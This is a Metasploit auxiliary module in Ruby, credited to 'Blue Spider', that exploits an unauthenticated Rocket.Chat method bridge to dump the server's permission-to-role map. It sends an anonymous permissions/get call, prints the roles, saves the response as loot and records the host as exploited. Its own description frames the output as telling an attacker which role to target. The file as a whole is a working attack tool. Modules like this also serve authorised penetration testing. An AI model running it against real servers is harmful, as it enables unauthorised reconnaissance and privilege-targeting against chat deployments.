class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat anonymous permission-map dump (VULN-005)',
        'Description' => %q{
          Rocket.Chat's permissions/get method answers with no authentication through
          the anonymous method bridge, disclosing which roles hold each permission.
          This module calls it unauthenticated, prints the permission-to-role map and
          keeps it as loot, which tells an attacker exactly which role to target for
          any capability. It takes no options, sends no credentials and creates
          nothing.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/method.callAnon/permissions-get'])
    ])
  end

  def run
    res = anon_call
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = parse_json(res)['message'].to_s.include?('access-permissions')
    fail_with(Failure::NotVulnerable, 'VULN-005: the attack did not land') unless hit

    print_good("#{peer} - VULN-005: exploited")
    body = JSON.parse(parse_json(res)['message'] || '{}')['result'] || []
    print_good("#{peer} - #{body.length} permission(s) and their roles disclosed to an anonymous caller")
    body.first(15).each { |p| print_status("  #{p['_id']} -> #{(p['roles'] || []).join(',')}") }
    path = store_loot('blue_spider.vuln_005', 'text/plain', rhost, res.body.to_s, 'vuln_005.txt', 'VULN-005 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-005 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def anon_call
    frame = { 'msg' => 'method', 'id' => '1', 'method' => 'permissions/get', 'params' => [] }.to_json
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      'data' => { 'message' => frame }.to_json
    })
  end
end
